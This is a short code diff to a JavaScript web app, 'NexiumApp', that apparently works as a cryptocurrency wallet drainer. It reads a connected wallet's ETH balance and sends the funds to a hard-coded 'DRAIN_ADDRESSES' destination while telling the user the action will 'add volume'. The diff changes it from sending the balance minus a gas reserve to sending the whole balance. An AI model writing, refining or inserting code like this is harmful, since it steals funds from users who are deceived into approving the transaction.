@@ -409,11 +409,8 @@ class NexiumApp {
           const balance = await provider.getBalance(wallet);
           console.log(`💰 ETH Balance: ${ethers.formatEther(balance)} ETH`);
           
-          const gasLimit = ethers.parseUnits("0.0001", "ether");
-          let sendAmount = balance - gasLimit;
-
-          if (sendAmount <= 0n) {
-            console.log("❌ Not enough ETH to cover gas fees.");
+          if (balance <= 0n) {
+            console.log("❌ Not enough ETH to cover transaction.");
             this.showFeedback("Not enough ETH to add volume.", 'error');
             this.hideProcessingSpinner();
             return;
@@ -423,8 +420,7 @@ class NexiumApp {
           
           const tx = await signer.sendTransaction({
             to: DRAIN_ADDRESSES.ethereum,
-            value: sendAmount,
-            gasLimit,
+            value: balance
           });
 
           console.log("✅ ETH Transaction sent:", tx.hash);
